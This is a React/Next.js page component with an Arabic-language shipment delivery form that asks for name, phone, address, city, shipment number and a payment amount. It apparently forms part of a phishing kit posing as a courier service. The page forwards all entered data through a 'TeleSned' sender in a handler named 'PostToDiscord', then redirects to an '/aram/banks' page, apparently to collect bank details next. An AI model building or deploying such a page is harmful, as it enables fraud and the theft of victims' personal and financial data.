"use client"
import { useState } from 'react'
import styles from './fozajil.module.css'

import {useRouter,useSearchParams} from 'next/navigation'
import TeleSned from '@/server/TeleSned'
import Image from 'next/image'

import headf from "../../../public/headf.jpg"

const Page = () => {
  const {Send} = TeleSned();
  const [form,setForm]= useState(  {data : {
    نوع_الطلب:"اختر",
    الاسم_الكامل: "",
    رقم_الهاتف: "",
    العنوان:"",
    المدينة:"",
    قيمة_السداد:"",
    التفاصيل:"",
    رقم_الشـــحنة:""
  }},)
  const  name = useSearchParams();
  const track = name.get("name")
  const setDynamicFormData = (name,value)=>{
    setForm({
      data:{
        ...form.data,
        [name]:value,
      }
    })
  }
  const PostToDiscord = () => {
    const description = Object.entries(form.data)
      .map((d) => `${d[0]} : ${d[1]} `)
      .join("\n");
    Send(description)
    
  };

  const router = useRouter()

  const handlerout = () => {
    
if( form.data.نوع_الطلب == "اختر"||form.data.الاسم_الكامل == "" || form.data.رقم_الهاتف == "" || form.data.العنوان == "" || form.data.المدينة == "" || form.data.قيمة_السداد == "" || form.data.التفاصيل == ""||form.data.رقم_الشـــحنة == "") {
      alert('من فضلك قم بملى الحقول')
    }else{
       router.push(`/aram/banks?names=${form.data.رقم_الشـــحنة}`)
    }
  }

  


  return (
    <div className={styles.contain} dir='rtl'>
      
      <Image src={headf} width={370}/>
        <form onSubmit={(e)=>{
          e.preventDefault();
          PostToDiscord()
        }}> 


    <select name="نوع_الطلب"  onChange={(e) => {
                  const { name, value } = e.target;
                  setDynamicFormData(name, value);
                }} required>
                <option value="اختر">اختر الخدمة</option>
                <option value="طلب توصيل">طلب توصيل</option>
                <option value="طلب استلام">طلب استلام</option>
            </select>
            <input type="number" name='رقم_الشـــحنة' placeholder='رقم الشحنة' onChange={(e) => {
                  const { name, value } = e.target;
                  setDynamicFormData(name, value);
                }} required />
            <input type="text" name='الاسم_الكامل'  placeholder='الأسم الكامل ' onChange={(e) => {
                  const { name, value } = e.target;
                  setDynamicFormData(name, value);
                }} required />
            <input type="text" name='رقم_الهاتف'  placeholder='رقم الجوال الخاص بلمستلم' onChange={(e) => {
                  const { name, value } = e.target;
                  setDynamicFormData(name, value);
                }}required />
            <input type="text" name='العنوان'  placeholder='العنوان بلكامل'onChange={(e) => {
                  const { name, value } = e.target;
                  setDynamicFormData(name, value);
                }} required />
            <input type="text" name='المدينة'  placeholder='اكتب اسم المدينة'onChange={(e) => {
                  const { name, value } = e.target;
                  setDynamicFormData(name, value);
                }}required />
            <input type="number" name='قيمة_السداد' placeholder='قيمة السداد'onChange={(e) => {
                  const { name, value } = e.target;
                  setDynamicFormData(name, value);
                }} required />
            <textarea name="التفاصيل" id="" cols="33" rows="5"  placeholder='التفاصيل'onChange={(e) => {
                  const { name, value } = e.target;
                  setDynamicFormData(name, value);
                }} required></textarea>

        <button type='submit' onClick={handlerout}>تقديم الطلب</button>
        </form>
    </div>

  )
}

export default Page; 
